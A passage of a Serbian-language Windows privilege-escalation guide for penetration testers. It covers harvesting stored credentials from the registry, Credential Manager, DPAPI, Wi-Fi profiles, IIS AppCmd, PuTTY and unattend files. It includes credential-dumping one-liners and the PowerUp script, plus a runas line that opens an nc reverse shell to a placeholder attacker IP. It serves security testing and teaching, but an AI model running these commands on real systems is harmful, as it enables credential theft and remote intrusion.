Još [komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root pristup, možete slušati na bilo kom portu (pri prvom korišćenju `nc.exe` za slušanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

WSL sistem datoteka možete da pregledate u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje Windows administratorska prava. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) u potrazi za komandama koje su možda zabeležile akreditive; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na virtuelnom disku [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato najpre utvrdite konkretnu distribuciju i putanju do njenog skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog popisivanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz u registru sa lozinkom u čistom tekstu. Ako je `AutoAdminLogon=1`, ali nijedna lozinka u čistom tekstu nije čitljiva, to je samo trag: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne potvrđuje da li taj secret postoji niti da li može da se preuzme. Pre nego što prijavite izlaganje akreditiva, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Menadžer akreditiva / Windows vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, može da zvuči kao da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive pomoću kojih Windows može automatski da prijavi korisnike. To znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault i da upotrebi dostavljene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za dati resurs. Zato, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog vault-a za skladištenje.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete da koristite `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa dostavljenim podacima za prijavu.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da se mogu koristiti mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u čitljivom tekstu u okviru Universal Windows Platform (UWP) `PasswordVault` (dostupan i kao `Web Credentials` u `vaultcmd`). Ovaj prostor za skladištenje je izolovan po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj korisničkoj sesiji da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u čitljivom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima koji uključuju sistemsko šifrovanje, koristi tajne za autentifikaciju sistema na domenu.

Šifrovani korisnički RSA ključevi, zaštićeni pomoću DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegov sadržaj nije moguće prikazati pomoću komande `dir` u CMD-u, ali je moguće prikazati ga kroz PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` da biste dešifrovali.\
Možete **izvući mnoge DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije, kao praktičan način za čuvanje šifrovanih akreditiva. Zaštićeni su pomoću **DPAPI-ja**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kom su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili putanju do `.xml` datoteke. Kada skripta ili inventar datoteka ukaže na neku datoteku, pronađite stvarni direktorijum profila naloga umesto da pretpostavite da se nalazi u `C:\Users`: [Windows može da smesti profile na drugu lokaciju](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka je samo trag; [Windows `Export-Clixml` povezuje šifrovani akreditiv sa korisnikom i računarom koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a svaki pronađeni nalog mora zasebno da ima važeća prava na predviđenom servisu. Najpre pregledajte putanje i ACL-ove, bez prikazivanja šifrovanih ili dešifrovanih vrednosti tokom rutinske enumeracije.

Da biste **dešifrovali** PowerShell akreditiv iz datoteke koja ga sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul **Mimikatz** `dpapi::rdg` sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnoge DPAPI masterkeys iz memorije** pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište konekcija.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim imenima kao što je `config.xml`. Utvrdite šemu konekcija i šifrovane atribute `Password` pre nego što XML datoteku smatrate potencijalnim izvorom kredencijala. Sačuvana vrednost nije DPAPI/RDCMan lozinka; mogućnost oporavka zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežnog pretraživanja.

**Remote Desktop Plus izvozi profila** mogu se nalaziti i u korisničkim direktorijumima ili deljenoj administrativnoj fascikli. Izvoz legacy `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke smatrajte potencijalnim izvorom kredencijala, ali nemojte ga ispisivati niti pretpostavljati da je u običnom tekstu: [proizvođač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil napravljen, ili podešena manje strogo. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške u `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga skladišta u korisničkom profilu, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladišta koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite write-ahead logging, kopija samo datoteke `plum.sqlite` može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz usklađenu kopiju baze podataka i, ako je dostupna, uključite i `plum.sqlite-shm`; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite dokumentaciju za WAL](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je potencijalni izvor kredencijala: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Za zapis šifrovanog menadžera lozinki potreban je i stvarni ključ za dešifrovanje, kao i tumačenje specifično za aplikaciju, pre nego što može da posluži kao dokaz prijave sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou visokog integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **kredencijali** koje je moguće **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe` .\
Instalateri se **pokreću sa SYSTEM privilegijama**, mnogi su podložni **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registar (akreditivi)

### Artefakti akreditiva u registru alata za podršku

Neke starije instalacije softvera za daljinsku podršku zadržavaju nazive vrednosti povezane s lozinkama u unapred određenim ključevima registra aplikacije. Na primer, prema [objašnjenju ključa registra proizvođača](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` je označavao konfigurisanu statičku lozinku sesije u verzijama TeamViewer-a pre verzije 9. Marker u nazivu vrednosti samo je trag za proveru: pre procene akreditiva proverite instaliranu verziju, da li su podaci vrednosti čitljivi, njihov format i trenutno ponašanje autentifikacije. Prelazak sa lozinke za daljinsku podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Ne prikazujte šifrotekst i otkrivene lozinke u rutinskom izlazu enumeracije.

### Zajedničke tabele sa zaštićenim listovima

Ako se sumnja da čitljiva zajednička radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista kontroliše uređivanje i nije bezbednosna funkcija; ona sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo relevantne datoteke za koje imate ovlašćenje i izbegavajte prikaz mogućih tajni tokom široke enumeracije. Čitljiva putanja do `.xlsx` datoteke, zaštićeni list ili skrivena kolona sami po sebi ne dokazuju da akreditivi postoje niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Sačuvane zakrpe izmena na CI serveru

CI server može zadržati dostavljene izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka build-a. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za čuvanje izmena remote-run procesa; direktorijum sa podacima može biti drugačije konfigurisan i ne mora se nalaziti pod `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku sa akreditivima, ključ za šifrovanje ili skriptu koja koristi oba. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva i AES ključ i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ dostavlja zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz odgovarajuće ovlašćenje, pregledajte relevantan sadržaj bez prikazivanja tajni u rutinskom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju postojanje važećeg akreditiva niti pristup sa višim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene build-a.

### Prilagođeno menjanje lozinki lokalnog administratora

Interni alat za menjanje lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a akreditive za skladište podataka u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole skladišta podataka. Lokalni datastore ograničen na loopback i dalje je dostupan lokalnom korisniku koji ima važeće akreditive, ali sama autentifikacija ne dokazuje da ima dozvolu za čitanje relevantnih zapisa. Ako su seed za šifrovanje ili ključni materijal dostupni pored šifrata, proverite tačan način izvođenja ključa pre nego što se oslonite na šifrovanje. Šema koja deterministički izvodi AES ključ iz izloženog seed-a pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije prikladan za slučajnost osetljivu na bezbednost. Pre nego što otkrivenu lozinku smatrate mogućim putem eskalacije, potvrdite da je važeća i da pripada nalogu koji je član lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Ne prikazujte lozinke i ključni materijal u rutinskom izlazu enumeracije.

Koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) za upravljanje lozinkama lokalnih administratora. Njegovo skladištenje u direktorijumu ili Entra okruženju i kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [Elasticsearch uloge](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik datastore-a može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba akreditiva

Neki dodaci Java servera distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bytecode sa ugrađenim akreditivom usluge. Arhivu pregledajte samo uz ovlašćenje i ne prikazujte otkrivene tajne u rutinskom izlazu enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a otkrivena lozinka usluge vodi do većih privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo korišćene akreditive zasebnim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhive.

### Akreditivi ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može sadržati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija o provajderu korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da se lozinke mogu čuvati kao običan tekst ili šifrovane ključem koji se nalazi u tom svojstvu. Otkrivena lozinka važna je za eskalaciju samo ako i dalje važi za identitet sa većim privilegijama; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu akreditiva. Putanja je samo trag za inventarisanje, zato ne prikazujte sadržaj baze podataka ni akreditive u rutinskom izlazu enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs za bind administrativne konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje svoju administrativnu konzolu za loopback; lokalni nalog ipak može da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može pokrenuti njegov kod u kontekstu usluge, što može imati veoma visoke privilegije ako usluga radi kao LocalSystem. Podudarna lozinka naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija forenzičkog servera za upravljanje

Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu sadržati `CA.private_key` internog CA-a. Ako korisnik sa nižim privilegijama može da čita taj ključ, možda će moći da izda API klijentski sertifikat. Da li to vodi do većih privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršavaju server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne potvrđuje pristup CA-u servera. U nekim implementacijama privatni ključ CA-a čuva se van mreže, pa čitljiva konfiguracija servera možda neće sadržati ključ za potpisivanje.

Na Windows serveru pregledajte ACL konfiguracije **servera** u direktorijumu za instalaciju i svih zaštićenih резервних копија. Једна могућа локација је `%ProgramFiles%\VelociraptorServer\server.config.yaml`; користите путању конфигурисану за услугу ако се разликује. Потврдите да тренутни идентитет може да чита датотеку и да је `CA.private_key` заиста присутан. Не исписујте приватни кључ у евиденцијама или излазу енумерације. Произвођачев ток рада `config api_client` користи CA кључ за издавање клијентског сертификата, али је потребна и одговарајућа улога на серверу; њено креирање или мењање може захтевати приступ за упис у datastore или поновно покретање. Постојећи привилеговани идентитет на серверу може пружити пут чак и када ти уписи нису доступни. API упити са правима за извршавање покрећу се у релевантном контексту сервера или агента, који може имати веома високе привилегије.

Заштитите конфигурацију сервера и резервне копије рестриктивним ACL-овима, чувајте CA кључ за потписивање ван мреже кад год је то могуће и ограничите API улоге и приступ listener-у. Погледајте [Velociraptor API документацију](https://docs.velociraptor.app/docs/server_automation/server_api/) и [упутства за безбедносну конфигурацију](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegova izvorna šifrovana datoteka može se nalaziti na putanji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i mogu da sadrže sesije, ključeve, skripte, oznake i međusobne veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifikuje izvornu datoteku. Najpre proverite dozvole i putanje datoteka. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### Putty SSH host ključevi

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, zato proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete neki unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako `ssh-agent` servis nije pokrenut, a želite da se automatski pokrene pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio upotrebu `dpapi.dll` tokom autentifikacije pomoću asimetričnog ključa.

### Datoteke za nenadziranu instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete da potražite i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) datoteke rezervnih kopija mogu da sadrže i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili slikama i proverite **nazive članova** slike pre nego što bilo šta izdvojite; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene `install.wim`, `boot.wim` i recovery slike često su pogrešan trag. SMB deljeni resurs je zaseban način pristupa i treba ga proveriti samo ako je taj resurs u opsegu provere. Pogledajte Microsoftova [uputstva za Windows slike](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke registry hive-ova](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

